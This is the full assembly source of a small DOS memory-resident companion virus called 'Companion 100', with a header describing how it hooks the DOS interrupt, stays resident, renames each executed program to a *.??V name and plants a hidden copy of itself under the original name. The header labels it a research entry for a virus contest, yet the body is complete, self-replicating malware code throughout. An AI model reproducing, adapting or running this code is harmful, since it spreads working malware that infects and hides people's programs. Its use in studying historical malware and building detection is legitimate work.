﻿

;                              Companion 100
;
;         Memory Resident Companion File Virus by Stormbringer
;
;   This virus is a simple companion virus that works by renaming any file
;that is executed to *.??V and creating a hidden file with the original name.  
;If it is not in memory, then the first time an infected program is run it
;will install itself in memory and terminate.  After that, any attempt to
;execute an infected file will execute the renamed host, and any other 
;execution attempt will infect the file executed.   The virus is 100 bytes
;in length.
;
;   Research Virus ONLY!!! Written for entry into Ludwig's Virus Contest.

.model tiny
.radix 16
.code
        org 100
start:        
        mov     ax,3521
        int     21
        mov     word ptr [IP_21],bx
        mov     word ptr [CS_21],es             ;Get Int 21 address and save

        mov     dx,offset INT_21
        mov     ah,25                           ;Set Int 21 handler
        int     21

        mov     dl,offset End_Memory+1-100          ;Go TSR
        int     27

INT_21:
        cmp     ah,4bh                          ;If it's not an execute 
        jne     Go_Int_21                       ;command, continue with
                                                ;INT 21.

Execute:                                        ;DS:DX = Filename
        push    si bx cx di es ax ds dx         ;Save REGS
        
        mov     di,offset New_Fname             ;Setup regs to copy filename
        push    di
        mov     si,dx
        
        push    cs
        pop     es

Load_Filename:                                  ;Load filename into New_Fname
        lodsb
        stosb
        or      al,al
        jnz     Load_Filename

        mov     byte ptr es:[di-2],'V'         ;New name character 
                                               
        
        mov     ah,56
        pop     di                              ;Rename file to *.??V
        int     21
        jc      Already_there                   ;If it doesn't work, then
                                                ;it's probably already 
                                                ;infected, so let's run the 
                                                ;host file.
Create_New_File:
        mov     ah,3c
        pop     dx
        push    dx
        mov     cl,0010b                        ;Create file with original 
        int     21                              ;name.

        push    cs
        pop     ds

        xchg    ax,bx
        
        mov     ah,40
        mov     cl,offset end_prog-100          ;Write virus to it.
        mov     dx,100
        int     21

        mov     ah,3e
        int     21                              ;Close.
        
Already_There:
        pop     dx ds ax es di cx bx            ;Restore all but SI
        mov     byte ptr ds:[si-2],'V'          ;Change last byte of orig.
                                                ;filename to run host.
        pop     si                              ;restore SI.

Go_Int_21:
        db      0ea                             ;Jump to Int 21.
end_prog:
IP_21   dw      ?
CS_21   dw      ?
New_Fname       db      30 dup (?)
End_Memory:
end start

